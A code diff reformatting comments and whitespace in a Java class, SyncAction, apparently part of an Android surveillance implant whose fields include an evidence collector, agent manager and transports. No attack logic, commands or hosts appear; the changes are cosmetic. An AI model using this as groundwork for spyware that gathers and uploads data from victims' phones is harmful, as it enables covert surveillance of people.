@@ -26,16 +26,16 @@ import com.ht.RCSAndroidGUI.utils.Check;
  * The Class SyncAction.
  */
 public abstract class SyncAction extends SubAction {
-	
+
 	/** The log collector. */
 	protected EvidenceCollector logCollector;
-	
+
 	/** The agent manager. */
 	protected AgentManager agentManager;
 	// protected Transport[] transports = new Transport[Transport.NUM];
 	/** The transports. */
 	protected Vector transports;
-	
+
 	/** The protocol. */
 	protected Protocol protocol;
 
@@ -50,9 +50,11 @@ public abstract class SyncAction extends SubAction {
 
 	/**
 	 * Instantiates a new sync action.
-	 *
-	 * @param actionId the action id
-	 * @param confParams the conf params
+	 * 
+	 * @param actionId
+	 *            the action id
+	 * @param confParams
+	 *            the conf params
 	 */
 	public SyncAction(final int actionId, final byte[] confParams) {
 		super(actionId, confParams);
@@ -66,9 +68,12 @@ public abstract class SyncAction extends SubAction {
 		initialized &= initTransport();
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
 	 */
+	@Override
 	public boolean execute() {
 		// #ifdef DBC
 		Check.requires(protocol != null, "execute: null protocol");
@@ -157,15 +162,16 @@ public abstract class SyncAction extends SubAction {
 
 	/**
 	 * Parses the.
-	 *
-	 * @param confParams the conf params
+	 * 
+	 * @param confParams
+	 *            the conf params
 	 * @return true, if successful
 	 */
 	protected abstract boolean parse(final byte[] confParams);
 
 	/**
 	 * Inits the transport.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	protected abstract boolean initTransport();
